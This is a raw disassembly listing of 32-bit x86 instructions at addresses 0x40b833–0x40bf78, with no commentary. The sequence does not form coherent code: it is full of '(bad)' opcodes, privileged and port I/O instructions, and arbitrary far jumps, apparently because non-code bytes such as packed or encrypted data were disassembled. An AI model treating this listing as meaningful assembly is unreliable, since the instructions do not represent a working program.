  40b833:	or     ah,dl
  40b835:	frstor [ebx-0x46ba7302]
  40b83b:	cwde   
  40b83c:	jg     0x40b880
  40b83e:	mov    eax,0x35f100b3
  40b843:	leave  
  40b844:	and    al,bl
  40b846:	das    
  40b847:	jne    0x40b809
  40b849:	sub    esi,DWORD PTR [eax]
  40b84b:	shl    BYTE PTR [edi],0x2e
  40b84e:	mov    DWORD PTR [eax],0xe394ab47
  40b854:	dec    edx
  40b855:	push   edi
  40b856:	cmp    DWORD PTR [edi],0x924f8a6c
  40b85c:	adc    dl,ah
  40b85e:	daa    
  40b85f:	shl    edx,1
  40b861:	mov    edx,0xeedd8c7f
  40b866:	nop
  40b867:	mov    edi,0xa1a796c0
  40b86c:	mov    esi,es
  40b86e:	test   edi,ebp
  40b870:	das    
  40b871:	mov    edx,0x30aa3922
  40b876:	rol    cl,0xf0
  40b879:	das    
  40b87a:	gs mov edi,0xdd9046d5
  40b880:	not    BYTE PTR [esi+0x13146d2e]
  40b886:	xor    esp,edx
  40b888:	or     ebx,DWORD PTR [ecx]
  40b88a:	loop   0x40b872
  40b88c:	pop    ds
  40b88d:	mov    dh,0xc5
  40b88f:	iret   
  40b890:	inc    ebx
  40b891:	retf   0xda58
  40b894:	xor    DWORD PTR [eax],0x2738d8c3
  40b89a:	pop    eax
  40b89b:	sbb    al,0xce
  40b89e:	popf   
  40b89f:	cmc    
  40b8a0:	out    0x2f,al
  40b8a2:	cmp    eax,0x32df8054
  40b8a7:	dec    edi
  40b8a8:	jle    0x40b88a
  40b8aa:	xor    dh,dh
  40b8ac:	js     0x40b867
  40b8ae:	mov    al,0xad
  40b8b0:	sbb    bh,BYTE PTR [eax-0x3f]
  40b8b3:	xchg   BYTE PTR [edx],bl
  40b8b5:	es dec edx
  40b8b7:	pop    ss
  40b8b8:	repz int 0x68
  40b8bb:	sbb    eax,0xbb9dfe3a
  40b8c0:	xchg   ecx,eax
  40b8c1:	mov    ds:0x7c533f70,al
  40b8c6:	fistp  WORD PTR [esi+edx*4+0x5f]
  40b8ca:	jns    0x40b893
  40b8cc:	or     BYTE PTR [ecx-0x34],dh
  40b8cf:	test   BYTE PTR [edx-0x3ce72a5b],bl
  40b8d5:	add    al,0x70
  40b8d7:	inc    esi
  40b8d8:	pop    ebx
  40b8d9:	jns    0x40b8b3
  40b8db:	jbe    0x40b881
  40b8dd:	xchg   DWORD PTR [ebx-0x16],ebp
  40b8e0:	push   edi
  40b8e1:	bound  esi,QWORD PTR [ecx+0x75a86d2]
  40b8e7:	je     0x40b8df
  40b8e9:	ds inc esp
  40b8eb:	mov    DWORD PTR [esi-0x11],esp
  40b8ee:	mov    edx,0xf65e1036
  40b8f3:	adc    ebx,DWORD PTR [ecx]
  40b8f5:	dec    ecx
  40b8f6:	inc    ebp
  40b8f7:	fwait
  40b8f8:	pop    eax
  40b8f9:	xchg   bh,dl
  40b8fb:	outs   dx,BYTE PTR ds:[esi]
  40b8fc:	add    eax,0xffb796a2
  40b901:	dec    esp
  40b902:	jp     0x40b8fe
  40b904:	push   eax
  40b905:	inc    ebx
  40b906:	stos   BYTE PTR es:[edi],al
  40b907:	sti    
  40b908:	(bad)  [eax]
  40b90a:	mov    dh,0x4e
  40b90c:	dec    esp
  40b90d:	ror    ebx,cl
  40b90f:	mov    esp,0x5ac06ddf
  40b914:	fdiv   st,st(7)
  40b916:	and    eax,0x739e3e04
  40b91b:	and    BYTE PTR [esi],bl
  40b91d:	jbe    0x40b933
  40b91f:	mov    gs,edx
  40b921:	adc    al,bh
  40b923:	pop    eax
  40b924:	sub    edx,ebp
  40b926:	imul   edi,ebx,0xfffffffd
  40b929:	pop    es
  40b92a:	int    0x47
  40b92c:	mov    al,ds:0x90c1a07a
  40b931:	cmp    DWORD PTR [eax],esi
  40b933:	push   bp
  40b935:	mov    BYTE PTR [ebx-0x232ebb42],dl
  40b93b:	mov    dh,0x53
  40b93d:	and    DWORD PTR [ebp-0x1e646c69],edx
  40b943:	inc    ebp
  40b944:	pushf  
  40b945:	jl     0x40b8ee
  40b947:	sbb    al,0x4a
  40b949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b94a:	push   0xffffffc9
  40b94c:	mov    ecx,0x284567cb
  40b951:	sahf   
  40b952:	stos   DWORD PTR es:[edi],eax
  40b953:	mov    al,ds:0x9a2ce9be
  40b958:	mov    bh,0xba
  40b95a:	fnstcw WORD PTR [eax+eax*8]
  40b95d:	mov    dh,0x8c
  40b95f:	sahf   
  40b960:	or     DWORD PTR [edi],ecx
  40b962:	shr    BYTE PTR [ecx+0x50b13a78],cl
  40b968:	in     al,dx
  40b969:	js     0x40b9c2
  40b96b:	aaa    
  40b96c:	inc    ebp
  40b96d:	mov    esi,0x12d5a0ed
  40b972:	sub    eax,DWORD PTR [edi]
  40b974:	inc    esi
  40b975:	xchg   edi,eax
  40b976:	mov    bl,0xcf
  40b978:	jne    0x40b93b
  40b97a:	xchg   edx,eax
  40b97b:	(bad)  
  40b97c:	xchg   ecx,eax
  40b97d:	mov    bl,0x57
  40b97f:	in     eax,dx
  40b980:	jl     0x40b95f
  40b982:	inc    ecx
  40b983:	out    0x75,al
  40b985:	es jmp 0x9b62:0xa6495271
  40b98d:	dec    esi
  40b98e:	xor    DWORD PTR [ebx-0x6f822eed],0xf17013e0
  40b998:	inc    eax
  40b999:	(bad)  
  40b99a:	pop    ebx
  40b99b:	sbb    BYTE PTR [ebx-0x10],cl
  40b99e:	test   BYTE PTR [ecx+0x6b],0x93
  40b9a2:	std    
  40b9a3:	mov    ah,0xa8
  40b9a5:	inc    ebx
  40b9a6:	pop    ss
  40b9a7:	sbb    DWORD PTR [eax+0x70dace05],edi
  40b9ad:	adc    ch,bl
  40b9af:	outs   dx,BYTE PTR ds:[esi]
  40b9b0:	jo     0x40b94e
  40b9b2:	stos   DWORD PTR es:[edi],eax
  40b9b3:	(bad)  
  40b9b4:	dec    edi
  40b9b5:	sub    edi,DWORD PTR [edx]
  40b9b7:	call   0x97c0:0x425b70f1
  40b9be:	xlat   BYTE PTR ds:[ebx]
  40b9bf:	into   
  40b9c0:	inc    esp
  40b9c1:	jns    0x40ba05
  40b9c3:	mov    bl,0x11
  40b9c5:	dec    eax
  40b9c6:	sub    DWORD PTR [esi+0x4c],edi
  40b9c9:	lea    ebx,[ecx]
  40b9cb:	inc    edx
  40b9cc:	add    bh,ch
  40b9ce:	sbb    al,0x1a
  40b9d0:	or     bh,BYTE PTR [ebx+0x6def3afa]
  40b9d6:	and    BYTE PTR [eax+edi*2-0x23597596],0x26
  40b9de:	sti    
  40b9df:	xchg   DWORD PTR [edi],esi
  40b9e1:	cwde   
  40b9e2:	xchg   ebp,eax
  40b9e3:	mov    ebp,0xc3d41795
  40b9e8:	mov    al,0x83
  40b9ea:	adc    DWORD PTR [ebp+0x57aa4f73],ebx
  40b9f0:	push   ecx
  40b9f1:	dec    ebx
  40b9f2:	push   ebx
  40b9f3:	jbe    0x40b9ff
  40b9f5:	jne    0x40b97f
  40b9f7:	mov    ebx,0x8fbd1253
  40b9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9fd:	ins    BYTE PTR es:[edi],dx
  40b9fe:	mov    ah,0x5a
  40ba00:	stos   BYTE PTR es:[edi],al
  40ba01:	sub    esp,DWORD PTR [esi+0x8aa290f]
  40ba07:	adc    DWORD PTR [ecx],ebp
  40ba09:	and    eax,0xbd52c056
  40ba0e:	push   0x5b
  40ba10:	lds    edx,FWORD PTR [ebp+0x32e31293]
  40ba16:	mov    ds:0xcc7d5b6b,eax
  40ba1b:	or     eax,0x5b45dd2a
  40ba20:	ins    BYTE PTR es:[edi],dx
  40ba21:	mov    bh,0x1c
  40ba23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba24:	push   cs
  40ba25:	imul   ecx,DWORD PTR ds:0xce12d062,0x971773e5
  40ba2f:	and    dh,BYTE PTR [eax]
  40ba31:	xor    BYTE PTR [eax+0x22],ch
  40ba34:	stos   DWORD PTR es:[edi],eax
  40ba35:	dec    eax
  40ba36:	xor    BYTE PTR [ecx-0x4f1d75a1],0x49
  40ba3d:	xchg   esi,eax
  40ba3e:	lea    eax,[edx]
  40ba40:	inc    edx
  40ba41:	retf   
  40ba42:	pop    ecx
  40ba43:	mov    ebp,0xcd4b0d06
  40ba48:	mov    al,ds:0xe686ddfc
  40ba4d:	jns    0x40b9d7
  40ba4f:	xor    ecx,DWORD PTR [ebp-0x50075d56]
  40ba55:	in     al,dx
  40ba56:	imul   edx,esi,0x54
  40ba59:	pop    eax
  40ba5a:	fwait
  40ba5b:	test   al,0x5a
  40ba5d:	aas    
  40ba5e:	mov    ebp,0x896d53e3
  40ba63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba64:	(bad)  
  40ba65:	sti    
  40ba66:	fs call 0x8571:0x9629ed0b
  40ba6e:	adc    al,0xd4
  40ba70:	pop    esp
  40ba71:	xor    al,0x9d
  40ba73:	(bad)  
  40ba74:	call   FWORD PTR [esp+esi*2]
  40ba77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba78:	jp     0x40ba23
  40ba7a:	sbb    al,0x17
  40ba7c:	inc    edx
  40ba7d:	stos   BYTE PTR es:[edi],al
  40ba7e:	scas   al,BYTE PTR es:[edi]
  40ba7f:	dec    edi
  40ba80:	in     al,0xae
  40ba82:	adc    ebx,ecx
  40ba84:	xor    al,0xa1
  40ba86:	sub    DWORD PTR [ecx],ebx
  40ba88:	repz cli 
  40ba8a:	mov    bl,0xad
  40ba8c:	sub    DWORD PTR [ebx],esi
  40ba8e:	ds (bad) 
  40ba90:	scas   al,BYTE PTR es:[edi]
  40ba91:	pop    ebx
  40ba92:	or     al,0x5
  40ba94:	out    0x14,eax
  40ba96:	push   esp
  40ba97:	sub    eax,0x5102966c
  40ba9c:	adc    ecx,eax
  40ba9e:	out    0x9,eax
  40baa0:	cmp    eax,0x7c1f46f6
  40baa5:	cmp    ebx,DWORD PTR [eax]
  40baa7:	cs aaa 
  40baa9:	ror    DWORD PTR ds:0x2ea6e04e,cl
  40baaf:	fisttp QWORD PTR [esi]
  40bab1:	push   ds
  40bab2:	add    cl,BYTE PTR ds:0x48c5ff5c
  40bab8:	int    0xd0
  40baba:	sub    BYTE PTR [edi-0x17],dl
  40babd:	loop   0x40ba82
  40babf:	dec    ecx
  40bac0:	pop    eax
  40bac1:	aad    0x85
  40bac3:	push   edx
  40bac4:	pop    ds
  40bac5:	clc    
  40bac6:	mov    ecx,0x24e95c81
  40bacb:	(bad)  
  40bacc:	test   al,0x56
  40bace:	mov    ds:0x2b09b95c,eax
  40bad3:	add    BYTE PTR [eax-0x62],0x7e
  40bad7:	and    al,BYTE PTR [ebp-0x632a4838]
  40badd:	mov    dl,0x1e
  40badf:	mov    edx,0x53fe71d7
  40bae4:	mov    ebx,0xaa752f6f
  40bae9:	and    al,bh
  40baeb:	jb     0x40ba95
  40baed:	test   al,0xa5
  40baef:	ret    0xdbf5
  40baf2:	push   ss
  40baf3:	sbb    al,0xe8
  40baf5:	and    DWORD PTR [esi+0x1dedee9c],0xfffffff2
  40bafc:	xor    DWORD PTR [edx],edx
  40bafe:	add    ebp,ebx
  40bb00:	add    ah,BYTE PTR [ecx]
  40bb02:	and    al,0x49
  40bb04:	shr    ebp,1
  40bb06:	icebp  
  40bb07:	nop
  40bb08:	repnz in eax,dx
  40bb0a:	std    
  40bb0b:	xor    eax,0x885507fc
  40bb10:	inc    esp
  40bb11:	sub    al,0xfe
  40bb13:	bnd jmp 0x40bb69
  40bb16:	dec    cl
  40bb18:	inc    eax
  40bb19:	fidivr WORD PTR [ebx+edi*2+0x29]
  40bb1d:	test   DWORD PTR [esi+0x6f3bace3],ebp
  40bb23:	inc    ebx
  40bb24:	or     DWORD PTR [edx+0x3c],ecx
  40bb27:	sub    ebp,DWORD PTR [eax-0x240a8735]
  40bb2d:	adc    BYTE PTR [eax-0x4fcf59ac],dl
  40bb33:	add    esi,DWORD PTR [edx-0xe1b8951]
  40bb39:	sub    esp,DWORD PTR [esi+0x15]
  40bb3c:	imul   ebx,DWORD PTR [eax-0x63b21dcc],0x1fa94190
  40bb46:	jmp    0x40bb23
  40bb48:	mov    ah,0xdd
  40bb4a:	inc    edx
  40bb4b:	xchg   ecx,eax
  40bb4c:	xor    eax,0xfe5e5223
  40bb51:	mov    edx,0xa4603e9a
  40bb56:	lock aas 
  40bb58:	push   ds
  40bb59:	xor    edx,DWORD PTR [esi-0x6d5b38b9]
  40bb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb60:	aam    0xe8
  40bb62:	push   edi
  40bb63:	lock cli 
  40bb65:	jno    0x40bbde
  40bb67:	or     eax,0xf53f0836
  40bb6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6d:	lods   al,BYTE PTR ds:[esi]
  40bb6e:	aam    0x42
  40bb70:	aaa    
  40bb71:	xchg   DWORD PTR [edx-0x1c3ecacb],ecx
  40bb77:	add    dh,BYTE PTR [ebp+0x65942161]
  40bb7d:	xor    DWORD PTR [eax],esp
  40bb7f:	pop    edi
  40bb80:	pop    ss
  40bb81:	or     dh,ah
  40bb83:	(bad)  
  40bb84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb85:	loopne 0x40bb43
  40bb87:	sahf   
  40bb88:	mov    dh,0xf2
  40bb8a:	add    al,0x50
  40bb8c:	pop    ss
  40bb8d:	add    dh,BYTE PTR [ebp+0x4b4f0fd3]
  40bb93:	xchg   ecx,eax
  40bb94:	jecxz  0x40bbb8
  40bb96:	xor    ecx,esi
  40bb98:	sbb    edx,eax
  40bb9a:	xor    bh,BYTE PTR [ecx+0x23]
  40bb9d:	mov    bp,0xc423
  40bba1:	lods   eax,DWORD PTR ds:[esi]
  40bba2:	in     eax,dx
  40bba3:	xchg   ecx,eax
  40bba4:	int    0x3b
  40bba6:	mov    ecx,0x56dcefcc
  40bbab:	out    dx,al
  40bbac:	xor    al,0x30
  40bbae:	cmc    
  40bbaf:	pop    es
  40bbb0:	aam    0xaf
  40bbb2:	push   ecx
  40bbb3:	pop    esi
  40bbb4:	cmp    DWORD PTR [ebx-0x2df9a5a1],edi
  40bbba:	loop   0x40bb5d
  40bbbc:	jo     0x40bc15
  40bbbe:	fist   DWORD PTR [edx-0x17910d97]
  40bbc4:	push   es
  40bbc5:	imul   ch
  40bbc7:	mov    bl,0x84
  40bbc9:	test   BYTE PTR [ebp-0x34],dl
  40bbcc:	aaa    
  40bbcd:	fist   WORD PTR [esi]
  40bbcf:	jnp    0x40bc13
  40bbd1:	adc    eax,0x48
  40bbd4:	and    ebx,edx
  40bbd6:	lea    ebx,[ebp-0x35]
  40bbd9:	adc    eax,0xeaddadb3
  40bbde:	jns    0x40bb93
  40bbe0:	call   FWORD PTR [edi-0x1668a476]
  40bbe6:	and    al,0x98
  40bbe8:	stos   BYTE PTR es:[edi],al
  40bbe9:	dec    edx
  40bbea:	das    
  40bbeb:	cmp    BYTE PTR [ecx],0x88
  40bbee:	js     0x40bc65
  40bbf0:	jnp    0x40bb8e
  40bbf2:	cmp    al,0x72
  40bbf4:	add    BYTE PTR [ebx-0x465c9cb6],al
  40bbfa:	fs ds push 0x3e3094a9
  40bc01:	test   eax,0x93fc13d1
  40bc06:	test   BYTE PTR [ecx],al
  40bc08:	cmp    ebp,DWORD PTR [ebx-0x15]
  40bc0b:	jnp    0x40bbd8
  40bc0d:	sub    eax,0x5a95d789
  40bc12:	es jo  0x40bc2d
  40bc15:	and    esi,0xffffffa3
  40bc18:	test   al,0xfe
  40bc1a:	aaa    
  40bc1b:	pop    ebx
  40bc1c:	xor    dl,BYTE PTR [edx+0x69a1a439]
  40bc22:	mov    al,ds:0x3b00ecf2
  40bc27:	jb     0x40bc37
  40bc29:	inc    esi
  40bc2a:	push   ebx
  40bc2b:	aaa    
  40bc2c:	mov    esp,0x118f3906
  40bc31:	xchg   ecx,eax
  40bc32:	dec    eax
  40bc33:	jno    0x40bcaa
  40bc35:	aaa    
  40bc36:	mov    ecx,0x4ce71810
  40bc3b:	leave  
  40bc3c:	js     0x40bc29
  40bc3e:	mov    dl,0x21
  40bc40:	adc    BYTE PTR [ebx],ch
  40bc42:	sub    eax,0x75ae4909
  40bc47:	ins    DWORD PTR es:[edi],dx
  40bc48:	xchg   BYTE PTR [edx-0x3650e81d],cl
  40bc4e:	add    BYTE PTR [ebp-0x6e],0xa6
  40bc52:	rcr    bh,1
  40bc54:	adc    al,0xee
  40bc56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc57:	fs out dx,eax
  40bc59:	sbb    BYTE PTR [ebx+0x79],ch
  40bc5c:	push   eax
  40bc5d:	sbb    BYTE PTR [ebp+ecx*1-0x67697e9e],bl
  40bc64:	xor    eax,edi
  40bc66:	outs   dx,DWORD PTR ds:[esi]
  40bc67:	jecxz  0x40bc8e
  40bc69:	mov    ds:0xb87da4e6,al
  40bc6e:	mov    dh,dl
  40bc70:	mov    al,0x12
  40bc72:	sbb    dl,BYTE PTR [ebx-0x42]
  40bc75:	push   ss
  40bc76:	adc    al,0x8c
  40bc78:	sub    cl,BYTE PTR [esi]
  40bc7a:	cmp    edi,esi
  40bc7c:	xchg   ah,bl
  40bc7e:	sub    BYTE PTR [ecx+0x1407a58],bh
  40bc84:	inc    ebx
  40bc85:	push   DWORD PTR [edi-0x48e7d41d]
  40bc8b:	adc    al,0xf1
  40bc8d:	lds    edi,FWORD PTR [ebx+0x26]
  40bc90:	xchg   ecx,eax
  40bc91:	dec    ax
  40bc93:	cmp    ecx,eax
  40bc95:	cdq    
  40bc96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc97:	rol    DWORD PTR [esi-0x56],0x7b
  40bc9b:	jo     0x40bc40
  40bc9d:	test   bl,0x2e
  40bca0:	mov    dh,0xf6
  40bca2:	jnp    0x40bcb9
  40bca4:	jno    0x40bc76
  40bca6:	or     esi,DWORD PTR [ebp*8+0x6ea7394e]
  40bcad:	xor    ebp,DWORD PTR [esi+0xeb670a]
  40bcb3:	add    eax,0x6c07c4db
  40bcb8:	add    eax,0xbd051923
  40bcbd:	pop    edi
  40bcbe:	(bad)  
  40bcbf:	sar    eax,cl
  40bcc1:	jmp    FWORD PTR [ecx]
  40bcc3:	retf   0xf174
  40bcc6:	push   0x1f
  40bcc8:	in     al,dx
  40bcc9:	(bad)  
  40bcca:	push   0xffffffb0
  40bccc:	push   ebx
  40bccd:	push   esi
  40bcce:	iret   
  40bccf:	ret    
  40bcd0:	repnz cmp al,0x53
  40bcd3:	popa   
  40bcd4:	pop    eax
  40bcd5:	pop    edx
  40bcd6:	mul    DWORD PTR [edi-0x789b8563]
  40bcdc:	loopne 0x40bd45
  40bcde:	cli    
  40bcdf:	imul   ebx,DWORD PTR [esi-0x593c47b0],0x4e46ba07
  40bce9:	enter  0xd368,0x74
  40bced:	xor    eax,eax
  40bcef:	inc    ebx
  40bcf0:	cmp    DWORD PTR [ecx+0x3750eb10],esp
  40bcf6:	loop   0x40bcb7
  40bcf8:	repnz xchg esp,eax
  40bcfa:	xchg   bh,ch
  40bcfc:	lods   al,BYTE PTR ds:[esi]
  40bcfd:	iret   
  40bcfe:	icebp  
  40bcff:	mov    esi,0x27684268
  40bd04:	je     0x40bce6
  40bd06:	js     0x40bcaf
  40bd08:	outs   dx,BYTE PTR ds:[esi]
  40bd09:	imul   edx,DWORD PTR [edx],0x8e1c82c5
  40bd0f:	jae    0x40bcbc
  40bd11:	nop
  40bd12:	pop    ebp
  40bd13:	push   ebp
  40bd14:	fs push edx
  40bd16:	mov    ecx,0x6736bc2a
  40bd1b:	pop    es
  40bd1c:	xchg   BYTE PTR ds:0x832f877e,cl
  40bd22:	mov    edx,0x5af0be90
  40bd27:	mov    al,ds:0x992cc320
  40bd2c:	jecxz  0x40bd9e
  40bd2e:	and    al,BYTE PTR [esi-0x753ddcf7]
  40bd34:	jmp    0xbbeb:0xa3340f66
  40bd3b:	cmp    DWORD PTR [ebx+0x24f6ae21],edi
  40bd41:	mov    dh,BYTE PTR [ebx+0x58]
  40bd44:	or     al,0xc8
  40bd46:	lds    ecx,FWORD PTR [edx+0x4d]
  40bd49:	jo     0x40bcf9
  40bd4b:	repnz mov ebp,0x4c25a8f7
  40bd51:	fdivr  DWORD PTR [ecx+0x24]
  40bd54:	pushf  
  40bd55:	les    edx,FWORD PTR [edi+edx*8]
  40bd58:	cs dec esp
  40bd5a:	dec    edx
  40bd5b:	(bad)  
  40bd5c:	stc    
  40bd5d:	and    eax,0x2398ec8
  40bd62:	aaa    
  40bd63:	jo     0x40bd7f
  40bd65:	(bad)  
  40bd66:	(bad)  
  40bd67:	dec    edi
  40bd68:	fdivr  QWORD PTR [edi]
  40bd6a:	xchg   edx,eax
  40bd6b:	lea    ecx,[esi+0x44]
  40bd6e:	mov    dh,0xdb
  40bd70:	add    al,0xc6
  40bd72:	stos   DWORD PTR es:[edi],eax
  40bd73:	lods   al,BYTE PTR ds:[esi]
  40bd74:	sbb    al,al
  40bd76:	(bad)  
  40bd77:	imul   eax,DWORD PTR [eax-0x24ad71f2],0xffffffd5
  40bd7e:	jmp    0x40bde3
  40bd80:	mov    WORD PTR ds:0x79c93272,cs
  40bd86:	sub    esi,DWORD PTR [esi-0x35]
  40bd89:	push   ebx
  40bd8a:	ss mov edi,0xb3f56acb
  40bd90:	aaa    
  40bd91:	out    0x47,al
  40bd93:	clc    
  40bd94:	xchg   esp,eax
  40bd95:	lock aad 0x57
  40bd98:	sbb    al,0x43
  40bd9a:	loope  0x40bd29
  40bd9c:	push   edx
  40bd9d:	repz cmc 
  40bd9f:	dec    edx
  40bda0:	push   cs
  40bda1:	aad    0xfc
  40bda3:	ret    
  40bda4:	adc    al,0x50
  40bda6:	add    edx,DWORD PTR [ecx-0x65]
  40bda9:	mov    ds:0xe88c1fce,al
  40bdae:	popf   
  40bdaf:	and    ebp,DWORD PTR [edi-0x26]
  40bdb2:	out    dx,al
  40bdb3:	sub    DWORD PTR [edx],edi
  40bdb5:	cwde   
  40bdb6:	sahf   
  40bdb7:	adc    eax,0xfa0c5613
  40bdbc:	in     al,0x46
  40bdbe:	or     ebx,esi
  40bdc0:	mov    ch,0x85
  40bdc2:	in     eax,0x7f
  40bdc4:	(bad)  
  40bdc5:	lock jge 0x40bdc2
  40bdc8:	xchg   esi,eax
  40bdc9:	cmp    al,0xf8
  40bdcb:	cmp    edx,DWORD PTR [edx-0xc]
  40bdce:	outs   dx,BYTE PTR ds:[esi]
  40bdcf:	inc    esi
  40bdd0:	sbb    eax,0x1d7c0c97
  40bdd5:	cs push cs
  40bdd7:	inc    ebp
  40bdd8:	icebp  
  40bdd9:	out    dx,al
  40bdda:	dec    BYTE PTR [edx+edi*2-0x1135aebd]
  40bde1:	jb     0x40bdeb
  40bde3:	popf   
  40bde4:	pop    es
  40bde5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde6:	jmp    0x40be3b
  40bde8:	add    esp,DWORD PTR [ecx-0x7c]
  40bdeb:	mov    ds:0xf1e5f467,al
  40bdf0:	scas   eax,DWORD PTR es:[edi]
  40bdf1:	sub    ebx,ecx
  40bdf3:	lea    esp,[ebp-0x1a]
  40bdf6:	pop    es
  40bdf7:	jno    0x40be00
  40bdf9:	mov    dh,0xc6
  40bdfb:	mov    bh,0xce
  40bdfd:	push   edx
  40bdfe:	fmul   QWORD PTR [ebp-0x1d]
  40be01:	daa    
  40be02:	js     0x40bd9a
  40be04:	pop    edi
  40be05:	ficomp DWORD PTR [esi+ecx*1+0x31dea91c]
  40be0c:	jno    0x40be00
  40be0e:	jge    0x40be49
  40be10:	popf   
  40be11:	or     DWORD PTR [eax],0xf7861c31
  40be17:	shl    DWORD PTR [eax],1
  40be19:	stos   BYTE PTR es:[edi],al
  40be1a:	cs popf 
  40be1c:	mov    ah,0xf7
  40be1e:	test   al,0x22
  40be20:	push   esi
  40be21:	cmp    DWORD PTR [edi],ecx
  40be23:	push   ebp
  40be24:	or     eax,DWORD PTR [edi+0x1fffd18b]
  40be2a:	rcr    DWORD PTR [ebx-0x6f],1
  40be2d:	push   eax
  40be2e:	ficom  WORD PTR [edi+0x1c]
  40be31:	ins    DWORD PTR es:[edi],dx
  40be32:	xor    BYTE PTR [edi+0x17364760],dh
  40be38:	dec    ebp
  40be39:	div    dl
  40be3b:	jle    0x40be52
  40be3d:	mov    ecx,0x4e5d3987
  40be42:	xchg   edx,eax
  40be43:	mov    dl,0x4d
  40be45:	jbe    0x40be2e
  40be47:	cmc    
  40be48:	pushf  
  40be49:	mov    ecx,0x754d6117
  40be4e:	cs inc edx
  40be50:	cwde   
  40be51:	outs   dx,BYTE PTR ds:[esi]
  40be52:	mov    ebx,DWORD PTR ds:0x266d7705
  40be58:	dec    eax
  40be59:	outs   dx,BYTE PTR ds:[esi]
  40be5a:	out    0xa2,al
  40be5c:	test   dh,bh
  40be5e:	pop    ecx
  40be5f:	stos   DWORD PTR es:[edi],eax
  40be60:	inc    esp
  40be61:	int3   
  40be62:	adc    al,0xe5
  40be64:	sbb    al,0x46
  40be66:	push   ebp
  40be67:	adc    eax,DWORD PTR [ecx-0x6]
  40be6a:	xlat   BYTE PTR ds:[ebx]
  40be6b:	daa    
  40be6c:	dec    edx
  40be6d:	(bad)  
  40be6e:	pop    edx
  40be6f:	adc    BYTE PTR [edi+0x6b],al
  40be72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be73:	or     DWORD PTR [eax+0xe],ebx
  40be76:	mov    ebp,0x4bc7d16
  40be7b:	pop    ebp
  40be7c:	mov    ecx,0x60de6356
  40be81:	in     al,0x83
  40be83:	xchg   ebx,eax
  40be84:	mov    ah,0xc
  40be86:	mov    ch,0x88
  40be88:	add    bh,al
  40be8a:	inc    ebx
  40be8b:	lea    ebx,[edi+eax*1-0x2]
  40be8f:	dec    edi
  40be90:	stos   DWORD PTR es:[edi],eax
  40be91:	push   0xca84babc
  40be96:	or     edx,ebx
  40be98:	bound  ecx,QWORD PTR [ecx]
  40be9a:	rcl    DWORD PTR [ebp+0x36f9cbfd],1
  40bea0:	stos   DWORD PTR es:[edi],eax
  40bea1:	inc    esp
  40bea2:	mov    ds:0x97ba7562,al
  40bea7:	add    ecx,DWORD PTR [ecx+0x7110b141]
  40bead:	and    bh,bh
  40beaf:	sub    eax,0x77a60c38
  40beb4:	(bad)  
  40beb6:	jp     0x40be7f
  40beb8:	pop    edx
  40beb9:	mov    ah,0xa8
  40bebb:	push   es
  40bebc:	fdiv   DWORD PTR [eax-0x32]
  40bebf:	in     al,dx
  40bec0:	gs out dx,eax
  40bec2:	cli    
  40bec3:	jl     0x40bec3
  40bec5:	mov    dh,0xc0
  40bec7:	inc    ebp
  40bec8:	fcomip st,st(5)
  40beca:	cmp    cl,BYTE PTR [ebx-0x6b]
  40becd:	into   
  40bece:	jge    0x40bf01
  40bed0:	sbb    al,BYTE PTR [esi-0x21]
  40bed3:	arpl   WORD PTR [ebx+0x42],si
  40bed6:	xchg   ecx,eax
  40bed7:	xlat   BYTE PTR ds:[ebx]
  40bed8:	pop    eax
  40bed9:	mov    esp,0x3be3ee2c
  40bede:	or     eax,0x90017167
  40bee3:	repz daa 
  40bee5:	inc    esi
  40bee6:	sbb    eax,0xa1cd34ba
  40beeb:	mov    dl,0x72
  40beed:	fwait
  40beee:	stos   DWORD PTR es:[edi],eax
  40beef:	aaa    
  40bef0:	mov    BYTE PTR [ebp+0x2c],al
  40bef3:	mov    ebx,0x877fbc4
  40bef8:	mov    esp,es
  40befa:	cmc    
  40befb:	cmp    DWORD PTR [eax-0x15b79d8e],edi
  40bf01:	xor    dl,ah
  40bf03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf04:	push   0x7e
  40bf06:	mov    esp,0x968cd9cb
  40bf0b:	shl    DWORD PTR [ebx-0x3e],0x92
  40bf0f:	push   0xffffffd0
  40bf11:	pop    ebp
  40bf12:	test   bh,cl
  40bf14:	iret   
  40bf15:	daa    
  40bf16:	sbb    BYTE PTR [ecx],bh
  40bf18:	(bad)  
  40bf19:	mov    ds:0xe1c999df,al
  40bf1e:	js     0x40bec4
  40bf20:	into   
  40bf21:	lds    eax,FWORD PTR [eax+0x7e6a192f]
  40bf27:	mov    DWORD PTR [ebp-0x505b39aa],ebx
  40bf2d:	mov    eax,0x66ff7edc
  40bf32:	shl    DWORD PTR [edi+0x64],0x2f
  40bf36:	inc    esi
  40bf37:	ins    BYTE PTR es:[edi],dx
  40bf38:	leave  
  40bf39:	jmp    0xed6a:0x4cc31557
  40bf40:	jae    0x40bef9
  40bf42:	jbe    0x40bf71
  40bf44:	and    DWORD PTR [ecx*1-0x668c3f87],0x30
  40bf4c:	pushf  
  40bf4d:	or     edx,esp
  40bf4f:	xchg   edi,eax
  40bf50:	cmp    DWORD PTR [ecx-0x2f921c89],0x85466828
  40bf5a:	rol    bl,cl
  40bf5c:	scas   eax,DWORD PTR es:[edi]
  40bf5d:	and    bl,BYTE PTR [edx-0xf]
  40bf60:	push   edx
  40bf61:	mov    al,ds:0x9cac8197
  40bf66:	jg     0x40bf50
  40bf68:	cli    
  40bf69:	shl    BYTE PTR [ebx],0x53
  40bf6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf6d:	add    al,0x32
  40bf6f:	sub    ebx,ebp
  40bf71:	stos   BYTE PTR es:[edi],al
  40bf72:	outs   dx,DWORD PTR ds:[esi]
  40bf73:	mov    al,ds:0xd5201599
  40bf78:	shr    BYTE PTR [eax-0x5b253bb4],1
